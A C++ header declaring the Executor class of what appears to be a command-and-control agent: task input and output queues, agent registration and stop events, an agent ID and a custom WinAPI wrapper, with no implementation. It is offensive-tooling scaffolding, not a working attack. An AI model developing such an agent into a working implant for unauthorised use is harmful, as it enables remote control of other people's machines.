#pragma once

#include <Windows.h>
#include "utils/winapi.h"
#include "utils/event.h"
#include "utils/queue.h"

// Struct to store init params for Executor
struct StartExecutorThreadParameters
{
    WinApiCustom *pWinApiCustom;
    Event *pEventRegister;
    Queue *pTaskInputQueue;
    Queue *pTaskOutputQueue;
    Event *pEventAgentShouldStop;
    DWORD waitTimeForRegistrationMs;
    PCHAR agentId;
    DWORD executorIntervalMs;
};

class Executor
{
private:
    WinApiCustom *pWinApiCustom;
    Queue *pTaskInputQueue;
    Queue *pTaskOutputQueue;
    Event *pEventAgentShouldStop;
    Queue TaskInputSelfQueue;
    PCHAR agentId;
    DWORD executorIntervalMs;
    LPVOID pTaskAgentSpec;
    DWORD taskAgentSpecSize;

    void SetOutputInOutputQueue(IN PCHAR taskId, IN PCHAR taskOutput, BOOL shouldFreeTaskOutputBuffer);
    void SetRawOutputInOutputQueue(IN PCHAR taskId, IN LPVOID taskOutput, IN DWORD taskOutputLen, BOOL shouldFreeTaskOutputBuffer);
    void GetTasksForSelf();

public:
    /* Constructor */
    Executor(WinApiCustom *pWinApiCustom, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pAgentShouldStop, PCHAR agentId, DWORD executorIntervalMs);

    /* Destructor */
    ~Executor();

    /* Runs executor */
    void StartExecutor();

    /* Target for Executor's thread */
    static void WINAPI StartExecutorThread(StartExecutorThreadParameters *pExecutorParameters);
};